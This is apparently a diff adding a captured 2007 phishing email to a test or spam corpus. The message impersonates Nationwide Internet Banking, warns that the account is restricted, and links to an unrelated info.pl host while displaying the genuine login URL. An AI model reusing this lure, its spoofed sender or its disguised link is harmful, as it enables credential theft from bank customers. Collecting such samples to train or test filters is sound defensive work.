@@ -1,0 +1,91 @@
+From nobody Sun Jan 25 13:50:05 2015
+Return-Path: <www@malkavian.masters.pl>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 71306468C2
+ for <user@login.example.com>; Thu, 26 Jul 2007 23:17:25 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id AA76A131FA4C
+ for <user@example.com>; Thu, 26 Jul 2007 23:17:25 -0400 (EDT)
+Received: from malkavian.masters.pl (malkavian.masters.pl [81.15.165.146])
+ by mail.example.org (Postfix) with ESMTP id 92F1D6FA1C5
+ for <user@example.com>; Thu, 26 Jul 2007 23:17:25 -0400 (EDT)
+Received: by malkavian.masters.pl (postfix, from userid 80)
+ id F41B010F3AA; Fri, 27 Jul 2007 05:17:23 +0200 (CEST)
+To: user@example.com
+Subject: Important Notice : Confirm Your Internet Banking Details
+From: Nationwide Internet Banking <securityalert@nationwide.co.uk>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <20070727031723.F41B010F3AA@malkavian.masters.pl>
+Date: Fri, 27 Jul 2007 05:17:23 +0200 (CEST)
+X-Keywords: 
+Status: O
+Content-Length: 2352
+Lines: 62
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><META http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body>
+
+
+
+
+
+
+
+
+<div>
+
+<p><img border="0" src="http://www.nationwide.co.uk/_common_images/NWlogo.gif" width="346" height="71"></p>
+<table style="border-collapse:collapse" width="62%" border="0">
+  <tbody>
+    <tr>
+      <td width="563">
+        <p><font face="palatino linotype" color="#003366" size="3">Dear
+        Sir/Madam,<br>
+        <br>
+        Nationwide Bank is constantly working to increase security for all
+        Online Banking users, due to enhancement in our online Banking Access
+        homepage. To ensure the integrity of our online payment system, we
+        periodically review accounts. Your account might be restricted due to
+        numerous login attempts into your online account. Restricted accounts
+        continue to receive payments, but they are limited in their ability to
+        send or withdraw funds. To lift up this restriction, you need to confirm
+        your online banking details.</font></p>
+        <p><font face="palatino
+linotype" color="#003366" size="3">Click on the following link to confirm your
+        online banking details.</font></p>
+        <p><b><font face="palatino linotype" size="3"><a href="http://klen.sepopol.info.pl//components/franco/index.html" target="_blank"><font color="#00a8dc">https://www.nationwide.co.uk<WBR>/online/login.aspx
+        </font></a></font></b></p>
+        <font face="palatino linotype" size="3">
+        <p><font face="palatino
+linotype" color="#003366" size="3"><b>*Important*</b><br>
+        You are required to provide all necessary information completely and
+        correctly otherwise, due to security reasons, we may have to close your
+        account temporarily.<br>
+        <br>
+        </font></p>
+        <p><font color="#003366">Security Advisor<br>
+        <b> Nationwide</b></font><b><br>
+        </b></p>
+        </font></td>
+    </tr>
+  </tbody>
+</table>
+<hr size="1">
+<p><font face="palatino linotype" color="#808080" size="1">Please do not reply
+to this e-mail. Mail sent to this address cannot be answered.<br>
+For assistance, log in to your Nationwide Online Bank account and choose the
+"Help" link on any page.<br>
+<br>
+Nationwide Bank Email ID # 1009</font></p>
+
+</div>
+
+
+</body></html>
+
+
